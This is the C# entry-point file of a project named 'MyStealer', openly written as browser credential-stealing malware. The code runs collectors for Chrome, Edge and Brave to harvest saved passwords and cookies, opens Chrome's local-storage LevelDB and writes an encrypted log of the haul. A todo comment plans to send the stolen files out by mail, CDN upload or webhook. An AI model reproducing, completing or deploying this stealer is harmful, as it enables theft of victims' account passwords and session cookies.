using MyStealer.Collectors;
using MyStealer.Collectors.Browser;
using MyStealer.Collectors.Browser.ChromiumBased;
using Serilog;
using System;
using System.Collections.Generic;
using System.IO;

namespace MyStealer
{
    internal static class Program
    {
        private static readonly IBrowserCollector[] BrowserCollectors = new IBrowserCollector[] {
            new Chrome(),
            new MicrosoftEdge(),
            new Brave()
        };

        static void Main(string[] args)
        {
            using (var encHook = new LogEncryptionHook())
            {
                try
                {
                    /* Prepare */

                    NativeMethods.WriteLibraries();
                    if (File.Exists(Config.LogFilePath))
                        File.Delete(Config.LogFilePath); // Delete previous file to prevent appending encryption header

                    var logConfig = new LoggerConfiguration();
                    logConfig = (args.Length > 0 && args[0] == "verbose") ? logConfig.MinimumLevel.Verbose() : logConfig.MinimumLevel.Debug();
                    logConfig = logConfig.WriteTo.File(Config.LogFilePath, hooks: encHook);
                    Log.Logger = logConfig.CreateLogger();

                    /* Do the job */

                    Log.Information("Program entry point called on: {date}", DateTime.Now);

                    var creds = new HashSet<CredentialEntry>();
                    var cookies = new HashSet<CookieEntry>();
                    foreach (var browser in BrowserCollectors)
                    {
                        Log.Debug("Check if browser is available: {browser}", browser.ApplicationName);
                        if (browser.IsAvailable())
                        {
                            Log.Information("Running browser data collector: {browser}", browser.ApplicationName);
                            browser.Initialize();
                            foreach (var cred in browser.GetCredentials())
                                creds.Add(cred);
                            foreach (var cookie in browser.GetCookies())
                                cookies.Add(cookie);
                        }
                    }

                    // chrome local storage leveldb
                    var ldb = new LevelDB.DB(new LevelDB.Options { Comparator = new LevelDB.Comparator() }, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "User Data", "Profile 6", "Local Storage", "leveldb"));

                    /* Cleanup */

                    NativeMethods.CleanupLibraries();
                }
                catch (Exception ex)
                {
                    Log.Fatal(ex, "Main thread exception");
                }
                finally
                {
                    Log.CloseAndFlush();
                }
            }

            /* todo: send files over the internet (send to mail, upload to cdn, webhook, etc.) */

            // todo: debug purpose, remove later
            MyCryptExt.DecryptToFile(Config.LogFilePath + ".dec", File.OpenRead(Config.LogFilePath));
        }
    }
}
